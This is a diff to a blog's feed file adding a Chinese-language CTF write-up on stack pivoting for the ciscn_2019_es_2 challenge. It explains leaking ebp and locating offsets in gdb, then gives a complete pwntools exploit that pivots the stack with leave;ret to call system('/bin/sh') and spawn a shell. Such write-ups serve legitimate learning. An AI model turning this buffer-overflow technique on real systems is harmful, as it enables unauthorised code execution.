@@ -4,6 +4,19 @@
   
   
   <entry>
+    <title>栈迁移学习之路</title>
+    <link href="/2024/12/27/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
+    <url>/2024/12/27/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
+    
+    <content type="html"><![CDATA[<p>栈迁移学习的第一道题：</p><p>题目来源：BUU——ciscn_2019_es_2</p><p>通过ida查看（如下图），发现溢出长度不够（0x30-0x28&#x3D;8,只能覆盖ebp和ret，但是binsh没有，所以本题无法构造ROP链），因此要用到栈迁移。</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412270125859.png" alt="image-20241227012526812"></p><p>因此本题思路为：</p><ol><li><p>利用第一个read函数溢出，printf函数打印出ebp的地址。</p><p>（将原本的ebp改成aaa的地址，ret改成leave-ret指令）</p></li><li><p>利用第二个read函数构造rop链。如下图：</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412270129437.png" alt="image-20241227012904316"></p><p>0x38如何找：</p><p>gdb .&#x2F;文件名</p><p>r</p><p>ctrl+c</p><p>输入aaaa</p><p>看寄存器：0x88-0x50&#x3D;0x38</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412270118749.png" alt="image-20241227011827367"></p><p>0x28怎么找：</p><p>ebp-0x38+0x10       【0x10&#x3D;”aaaa”+p32(system)+p32(0)+p32(binsh_addr)共计16个字节】</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p=process(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br><br>elf=ELF(<span class="hljs-string">&#x27;./ciscn_2019_es_2&#x27;</span>)<br>leave_ret=<span class="hljs-number">0x080484b8</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x26</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">2</span><br>p.send(payload1)<br>p.recvuntil(<span class="hljs-string">&#x27;aabb&#x27;</span>)<br>ebp=u32(p.recv(<span class="hljs-number">4</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>])+p32(<span class="hljs-number">0</span>)+p32(ebp-<span class="hljs-number">0x28</span>)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br>payload2=payload2.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload2+=p32(ebp-<span class="hljs-number">0x38</span>)+p32(leave_ret)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>新生赛--pwn--wp</title>
     <link href="/2024/12/26/%E6%96%B0%E7%94%9F%E8%B5%9B-pwn-wp/"/>
     <url>/2024/12/26/%E6%96%B0%E7%94%9F%E8%B5%9B-pwn-wp/</url>
